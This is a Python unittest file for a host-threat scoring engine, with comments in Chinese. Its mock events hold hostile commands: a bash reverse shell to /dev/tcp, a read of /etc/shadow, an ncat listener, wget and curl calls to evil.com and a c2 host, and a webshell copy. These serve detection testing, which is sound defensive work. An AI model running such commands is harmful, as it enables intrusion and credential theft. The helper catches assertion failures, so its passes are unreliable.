import sys
import os
import unittest
import logging
# 引入 ContextEngine
sys.path.append(os.getcwd())

try:
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError:
    print("❌ 无法导入 ContextEngine，请在 TraceX 根目录下运行")
    sys.exit(1)

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger("DeepDiveTest")

class MockESClient:
    """模拟 ES 客户端，因为评分逻辑不需要查库，只需要输入数据"""
    def __init__(self):
        self.es = None

class TestHostScoring(unittest.TestCase):
    def setUp(self):
        # 初始化引擎，传入模拟的 ES 客户端
        self.engine = ContextEngine(MockESClient())
        print("\n" + "="*60)

    def _verify_score(self, case_name, mock_event, expected_min_score, expected_reason_keyword):
        """通用验证函数"""
        print(f"🧪 [测试场景] {case_name}")
        
        # 1. 执行评分
        result = self.engine.evaluate_threat(mock_event)
        score = result['score']
        reasons = result['reasons']
        severity = result['severity']
        
        # 2. 打印详情
        print(f"   📥 输入特征: {self._get_event_summary(mock_event)}")
        print(f"   📊 评分结果: {score} ({severity.upper()})")
        print(f"   📝 判黑依据: {reasons}")
        
        # 3. 断言验证
        try:
            self.assertGreaterEqual(score, expected_min_score, f"分数过低 (预期 >={expected_min_score})")
            
            # 验证原因关键词（部分匹配即可）
            reason_hit = any(expected_reason_keyword.lower() in r.lower() for r in reasons)
            if not reason_hit and expected_min_score > 0:
                self.fail(f"未找到预期判据关键字: '{expected_reason_keyword}'")
                
            print("   ✅ [PASS] 通过")
        except AssertionError as e:
            print(f"   ❌ [FAIL] 失败: {e}")

    def _get_event_summary(self, event):
        """提取日志摘要用于展示"""
        if event.get('event', {}).get('category') == 'memory':
            return f"Memory Risk: {event.get('memory', {}).get('anomalies', [{}])[0].get('risk_level')}"
        
        proc = event.get('process', {})
        file = event.get('file', {})
        cmd = proc.get('command_line') or proc.get('name')
        path = file.get('path')
        if cmd: return f"CMD: {cmd}"
        if path: return f"File: {path}"
        return "Unknown Event"

    # =========================================================================
    # 测试用例集 - 对应组员1任务详解 & ContextEngine 规则
    # =========================================================================

    def test_01_reverse_shell(self):
        """场景1: 反弹Shell (Reverse Shell)"""
        # 组员1会捕捉到命令行包含重定向到 /dev/tcp
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {
                "name": "bash",
                "command_line": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
                "pid": 1234
            }
        }
        # 预期: ContextEngine 规则 4 (Reverse Shell Pattern) -> 85分
        self._verify_score("反弹 Shell (Bash TCP)", event, 85, "Reverse Shell")

    def test_02_sensitive_file_access(self):
        """场景2: 敏感文件读取 (Sensitive File)"""
        # 组员1捕捉到 cat /etc/shadow
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {
                "name": "cat",
                "command_line": "cat /etc/shadow",
                "pid": 2345
            },
            "file": {
                "path": "/etc/shadow"
            }
        }
        # 预期: ContextEngine 规则 3 (Sensitive File Access) -> 70分
        self._verify_score("读取 /etc/shadow", event, 70, "Sensitive File")

    def test_03_dangerous_tool(self):
        """场景3: 危险工具使用 (Dangerous Tool)"""
        # 组员1捕捉到 ncat 使用
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {
                "name": "ncat",
                "command_line": "ncat -l -p 8080",
                "pid": 3456
            }
        }
        # 预期: ContextEngine 规则 1 (Dangerous Tool) -> 70分
        self._verify_score("执行 ncat", event, 70, "Dangerous Tool")

    def test_04_suspicious_download(self):
        """场景4: 可疑下载工具 (Suspicious Tool)"""
        # 组员1捕捉到 wget
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {
                "name": "wget",
                "command_line": "wget http://evil.com/trojan.sh",
                "pid": 4567
            }
        }
        # 预期: ContextEngine 规则 1 (Suspicious Tool) -> 60分 (Medium)
        self._verify_score("执行 wget 下载", event, 60, "Suspicious Tool")

    def test_05_low_priv_user_anomaly(self):
        """场景5: 低权限用户执行工具 (User Anomaly)"""
        # 组员1捕捉到 www-data 用户执行 whoami 或 curl
        event = {
            "event": {"category": "process", "action": "process_started"},
            "user": {"name": "www-data"},
            "process": {
                "name": "curl",
                "command_line": "curl http://c2.server/cmd",
                "pid": 5678
            }
        }
        # 预期: ContextEngine 规则 5 (Low-Priv User) -> 75分
        self._verify_score("www-data 用户执行 curl", event, 75, "Low-Priv User")

    def test_06_memdefense_critical(self):
        """场景6: 内存防御 - Critical (MemDefense)"""
        # 组员1 MemScanner 上报的结构
        event = {
            "event": {"category": "memory", "dataset": "mem_scanner"},
            "memory": {
                "anomalies": [
                    {"type": "ELF_HEADER", "risk_level": "CRITICAL"}
                ]
            }
        }
        # 预期: ContextEngine 规则 1 (MemDefense) -> 100分
        self._verify_score("内存扫描发现 ELF 头", event, 100, "MemDefense")

    def test_07_webshell_command_line(self):
        """场景7: 命令行 WebShell (v5.3.3 修复验证)"""
        # 组员1捕捉到 cp 操作
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {
                "name": "cp",
                "command_line": "cp source.txt /var/www/html/backdoor.php"
            }
        }
        # 预期: ContextEngine 规则 2.2 (WebShell Pattern in Command) -> 85分
        self._verify_score("命令行拷贝 WebShell", event, 85, "WebShell Pattern")

if __name__ == '__main__':
    unittest.main(verbosity=0)
